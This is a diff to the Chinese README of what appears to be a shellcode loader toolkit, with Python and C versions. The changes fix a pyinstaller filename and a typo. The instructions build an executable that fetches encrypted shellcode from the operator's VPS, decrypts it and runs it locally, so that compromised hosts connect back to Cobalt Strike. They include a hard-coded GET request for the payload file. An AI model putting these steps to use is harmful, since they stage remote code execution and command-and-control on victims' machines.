@@ -39,12 +39,12 @@ Powershell: Win10上测试没有问题,也就是ps5.1,更低版本未测试
    > 2. 运行generator.py,生成的payload自动保存在payload.txt中.
    > 3. 将payload.txt上传到你的VPS中,后续生成的加载器会从VPS中获取加密shellcode并在本地解密后执行
    > 4. 将在VPS上的payload路径填入PyLoader.py的url变量中,填入你刚刚设置的Key
-   > 5. 用`python pyinstaller.py -F -w pyshellcode.py`打包文件,可执行文件在pyshellcode文件夹下的dist中,双击运行可以看到主机上线
+   > 5. 用`python pyinstaller.py -F -w PyLoader.py`打包文件,可执行文件在pyshellcode文件夹下的dist中,双击运行可以看到主机上线
 
 3. C版本:
 
    > 1. 按要求填入你自己的Key,shellcdoe长度和shellcode,执行
-   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生产的加密shellcode保存在payload.txt文件中并将其放在服务器上(如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
+   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生成的加密shellcode保存在payload.txt文件中并将其放在服务器上(如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
    > 3. 在Loader中填入自己的Key和VPS的IP,编译
    > 4. 执行编译出的exe,CS上线
    
